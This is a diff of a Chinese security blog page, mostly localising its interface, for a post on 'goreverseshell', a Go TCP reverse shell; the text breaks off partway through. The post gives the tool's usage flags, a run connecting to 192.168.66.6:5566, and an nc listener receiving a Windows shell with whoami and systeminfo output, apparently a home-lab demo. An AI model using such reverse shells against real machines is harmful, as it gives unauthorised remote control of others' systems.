@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -19,22 +19,23 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/red/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Golang Tcp Reverse Shell123456789101112------------------------------------------------A golang based reverse shell------------------------------------------------ ____          _               _  __">
+    <meta name="description" content="记录 Go TCP Reverse Shell 的编译、监听与客户端运行方式。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="goreverseshell---基于golang的tcp-reverseshell">
 <meta property="og:url" content="https://lucifer11.xyz/2020/04/09/goreverseshell/index.html">
 <meta property="og:site_name" content="0xfd&#39;s blog">
-<meta property="og:description" content="Golang Tcp Reverse Shell123456789101112------------------------------------------------A golang based reverse shell------------------------------------------------ ____          _               _  __">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="记录 Go TCP Reverse Shell 的编译、监听与客户端运行方式。">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg">
 <meta property="article:published_time" content="2020-04-09T05:58:39.000Z">
-<meta property="article:modified_time" content="2020-08-16T16:51:01.692Z">
+<meta property="article:modified_time" content="2020-04-09T05:58:39.000Z">
 <meta property="article:author" content="253">
-<meta property="article:tag" content="golang">
-<meta property="article:tag" content="penetration tools">
+<meta property="article:tag" content="Go">
+<meta property="article:tag" content="Shell">
+<meta property="article:tag" content="网络编程">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg">
 
@@ -43,7 +44,7 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://lucifer11.xyz/2020/04/09/goreverseshell/","path":"2020/04/09/goreverseshell/","title":"goreverseshell---基于golang的tcp-reverseshell"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lucifer11.xyz/2020/04/09/goreverseshell/","path":"2020/04/09/goreverseshell/","title":"goreverseshell---基于golang的tcp-reverseshell"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>goreverseshell---基于golang的tcp-reverseshell | 0xfd's blog</title>
@@ -58,6 +59,7 @@
 <meta name="color-scheme" content="dark">
 <link rel="stylesheet" href="/css/cyberpunk.css">
 <script src="/js/gargantua.js" defer></script>
+<script src="/js/reader.js" defer></script>
 
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
@@ -72,7 +74,7 @@
     <div class="column">
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    <div class="toggle" aria-label="切换导航栏" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -91,7 +93,7 @@
   </div>
 
   <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
         <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
@@ -100,9 +102,9 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-知识库"><a href="/knowledge/" rel="section"><i class="fa fa-book fa-fw"></i>知识库</a></li><li class="menu-item menu-item-导读"><a href="/guide/" rel="section"><i class="fa fa-compass fa-fw"></i>导读</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-folder-open fa-fw"></i>分类</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
@@ -117,7 +119,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
+           placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -142,10 +144,10 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -161,25 +163,25 @@
     <img class="site-author-image" itemprop="image" alt="253"
       src="/images/fifteen-katana-zero-katana-zero.gif">
   <p class="site-author-name" itemprop="name">253</p>
-  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+  <div class="site-description" itemprop="description">漏洞分析、利用机制、二进制研究与安全工程</div>
 </div>
 <div class="site-state-wrap animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">214</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">78</span>
-        <span class="site-state-item-name">categories</span></a>
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">41</span>
-        <span class="site-state-item-name">tags</span></a>
+        <span class="site-state-item-count">312</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -212,7 +214,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="Back to top">
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -222,7 +224,7 @@
     <div class="sidebar-inner sidebar-blogroll">
       <div class="links-of-blogroll animated">
         <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
+          链接
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
@@ -252,7 +254,7 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lucifer11.xyz/2020/04/09/goreverseshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -262,12 +264,12 @@
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="0xfd's blog">
-      <meta itemprop="description" content="All things about infosec & ctf">
+      <meta itemprop="description" content="漏洞分析、利用机制、二进制研究与安全工程">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="goreverseshell---基于golang的tcp-reverseshell | 0xfd's blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="记录 Go TCP Reverse Shell 的编译、监听与客户端运行方式。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -280,52 +282,50 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">Posted on</span>
+      <span class="post-meta-item-text">发表于</span>
 
-      <time title="Created: 2020-04-09 13:58:39" itemprop="dateCreated datePublished" datetime="2020-04-09T13:58:39+08:00">2020-04-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2020-08-17 00:51:01" itemprop="dateModified" datetime="2020-08-17T00:51:01+08:00">2020-08-17</time>
+      <time title="创建时间：2020-04-09 13:58:39" itemprop="dateCreated datePublished" datetime="2020-04-09T13:58:39+08:00">2020-04-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">In</span>
+      <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/golang/" itemprop="url" rel="index"><span itemprop="name">golang</span></a>
+          <a href="/categories/%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工程与工具</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%B7%A5%E5%85%B7/Go%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">Go工具</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">Views: </span>
+      <span class="post-meta-item-text">阅读次数：</span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
+    <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">Word count in article: </span>
+      <span class="post-meta-item-text">本文字数：</span>
       <span>503</span>
     </span>
-    <span class="post-meta-item" title="Reading time">
+    <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>2 mins.</span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
+            <div class="post-description">记录 Go TCP Reverse Shell 的编译、监听与客户端运行方式。</div>
         </div>
       </header>
 
@@ -333,24 +333,24 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h4 id="Golang-Tcp-Reverse-Shell"><a href="#Golang-Tcp-Reverse-Shell" class="headerlink" title="Golang Tcp Reverse Shell"></a>Golang Tcp Reverse Shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>
+        <h4 id="Golang-Tcp-Reverse-Shell"><a href="#Golang-Tcp-Reverse-Shell" class="headerlink" title="Golang Tcp Reverse Shell"></a>Golang Tcp Reverse Shell</h4><figure class="highlight bash" data-code="LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkEgZ29sYW5nIGJhc2VkIHJldmVyc2Ugc2hlbGwKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBfX19fICAgICAgICAgIF8gICAgICAgICAgICAgICBfICBfXyAgICAgICAgICAgXyBfCnwgX18gKSBfICAgXyAgfCB8ICAgXyAgIF8gIF9fXyhfKS8gX3wgX19fIF8gX18vIC8gfAp8ICBfIFx8IHwgfCB8IHwgfCAgfCB8IHwgfC8gX198IHwgfF8gLyBfIFwgJ19ffCB8IHwKfCB8XykgfCB8X3wgfCB8IHxfX3wgfF98IHwgKF9ffCB8ICBffCAgX18vIHwgIHwgfCB8CnxfX19fLyBcX18sIHwgfF9fX19fXF9fLF98XF9fX3xffF98ICBcX19ffF98ICB8X3xffAogICAgICAgfF9fXy8KTXkgUVE6MTE4NTE1MTg2NwpCbG9nOiBodHRwczovL2ZkbHVjaWZlci5naXRodWIuaW8vCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JldmVyc2VzaGVsbA==">Download goreverseshell from my github<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <span id="more"></span>
 
-<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage of goreverseshell.exe:</span><br><span class="line">  -host string</span><br><span class="line">        the host to connect (default <span class="string">&quot;input host here&quot;</span>)</span><br><span class="line">  -port int</span><br><span class="line">        nc listenling port (default 5566)</span><br></pre></td></tr></table></figure>
+<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash" data-code="VXNhZ2Ugb2YgZ29yZXZlcnNlc2hlbGwuZXhlOgogIC1ob3N0IHN0cmluZwogICAgICAgIHRoZSBob3N0IHRvIGNvbm5lY3QgKGRlZmF1bHQgImlucHV0IGhvc3QgaGVyZSIpCiAgLXBvcnQgaW50CiAgICAgICAgbmMgbGlzdGVubGluZyBwb3J0IChkZWZhdWx0IDU1NjYpCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage of goreverseshell.exe:</span><br><span class="line">  -host string</span><br><span class="line">        the host to connect (default <span class="string">&quot;input host here&quot;</span>)</span><br><span class="line">  -port int</span><br><span class="line">        nc listenling port (default 5566)</span><br></pre></td></tr></table></figure>
 
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;goreverseshell.exe -host 192.168.66.6 -port 5566</span><br><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br><span class="line"><span class="string">*ip:192.168.66.6------port:&amp;d</span></span><br><span class="line"><span class="string">%!(EXTRA int=5566)</span></span><br></pre></td></tr></table></figure>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight bash" data-code="RDpcR29cdGVzdGdvZmlsZXNcb2xkYm95Z29cZ29wcm9ncmFtXGhhY2tpbmd3aXRoZ29sYW5nXGdvcmV2ZXJzZXNoZWxsPmdvcmV2ZXJzZXNoZWxsLmV4ZSAtaG9zdCAxOTIuMTY4LjY2LjYgLXBvcnQgNTU2NgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KQSBnb2xhbmcgYmFzZWQgcmV2ZXJzZSBzaGVsbAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIF9fX18gICAgICAgICAgXyAgICAgICAgICAgICAgIF8gIF9fICAgICAgICAgICBfIF8KfCBfXyApIF8gICBfICB8IHwgICBfICAgXyAgX19fKF8pLyBffCBfX18gXyBfXy8gLyB8CnwgIF8gXHwgfCB8IHwgfCB8ICB8IHwgfCB8LyBfX3wgfCB8XyAvIF8gXCAnX198IHwgfAp8IHxfKSB8IHxffCB8IHwgfF9ffCB8X3wgfCAoX198IHwgIF98ICBfXy8gfCAgfCB8IHwKfF9fX18vIFxfXywgfCB8X19fX19cX18sX3xcX19ffF98X3wgIFxfX198X3wgIHxffF98CiAgICAgICB8X19fLwpNeSBRUToxMTg1MTUxODY3CkJsb2c6IGh0dHBzOi8vZmRsdWNpZmVyLmdpdGh1Yi5pby8KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCippcDoxOTIuMTY4LjY2LjYtLS0tLS1wb3J0OiZkCiUhKEVYVFJBIGludD01NTY2KQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;goreverseshell.exe -host 192.168.66.6 -port 5566</span><br><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br><span class="line"><span class="string">*ip:192.168.66.6------port:&amp;d</span></span><br><span class="line"><span class="string">%!(EXTRA int=5566)</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg"></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">lucifer11\hasee</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           LUCIFER11</span><br><span class="line">OS ����:          Microsoft Windows 10 ��ҵ��</span><br><span class="line">OS �汾:          10.0.18363 ��ȱ Build 18363</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     HASEE</span><br><span class="line">ע������:       </span><br><span class="line">��Ʒ ID:          00328-90000-00000-AAOEM</span><br><span class="line">��ʼ��װ����:     2019/9/23, 18:08:18</span><br><span class="line">ϵͳ����ʱ��:     2020/4/8, 15:28:33</span><br><span class="line">ϵͳ������:       HASEE Computer</span><br><span class="line">ϵͳ�ͺ�:         PA70ES                         </span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 ����������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14</span><br><span class="line">Windows Ŀ¼:     C:\WINDOWS</span><br><span class="line">ϵͳĿ¼:         C:\WINDOWS\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume4</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��</span><br><span class="line">�����ڴ�����:     16,231 MB</span><br><span class="line">���õ������ڴ�:   6,104 MB</span><br><span class="line">�����ڴ�: ����: 19,303 MB</span><br><span class="line">�����ڴ�: ����:   4,390 MB</span><br><span class="line">�����ڴ�: ʹ����: 14,913 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WORKGROUP</span><br><span class="line">��¼������:       \\LUCIFER11</span><br><span class="line">�޲�����:         ��װ�� 14 ���޲�������</span><br><span class="line">                  [01]: KB4537572</span><br><span class="line">                  [02]: KB4515383</span><br><span class="line">                  [03]: KB4516115</span><br><span class="line">                  [04]: KB4517245</span><br><span class="line">                  [05]: KB4520390</span><br><span class="line">                  [06]: KB4521863</span><br><span class="line">                  [07]: KB4524244</span><br><span class="line">                  [08]: KB4524569</span><br><span class="line">                  [09]: KB4525419</span><br><span class="line">                  [10]: 